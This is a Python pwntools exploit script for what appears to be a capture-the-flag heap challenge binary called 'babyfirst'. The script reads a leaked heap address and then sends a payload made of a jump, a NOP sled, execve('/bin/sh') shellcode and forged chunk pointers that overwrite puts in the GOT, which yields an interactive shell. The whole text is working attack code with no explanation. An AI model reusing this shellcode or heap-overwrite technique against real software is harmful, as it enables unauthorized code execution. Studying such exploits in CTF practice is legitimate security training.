from pwn import *

s=process('./babyfirst')

shellcode="\x31\xc0\x50\x68\x2f\x2f"
shellcode+="\x73\x68\x68\x2f\x62\x69"
shellcode+="\x6e\x89\xe3\x89\xc1\x89"
shellcode+="\xc2\xb0\x0b\xcd\x80\x31"
shellcode+="\xc0\x40\xcd\x80"

jmp_0x50='\xeb\x50'
nop_slop='\x90'*100
puts_got=0x0804C018

print s.recvuntil('[size=755]\n[ALLOC][loc=')
heap_leak= int(s.recv(7),16)

print "[*]heap addr of size 250: "+str(hex(heap_leak))

print s.recvuntil('Write to object [size=260]:\n')

payload=''
payload+=jmp_0x50
payload+=nop_slop
payload+=shellcode
payload+='A'*(260-len(payload))
payload+=p32(1)
payload+=p32(puts_got-0x8)
payload+=p32(heap_leak)

raw_input('1')
s.sendline(payload)
raw_input('2')

print s.recv(1024)

s.interactive()
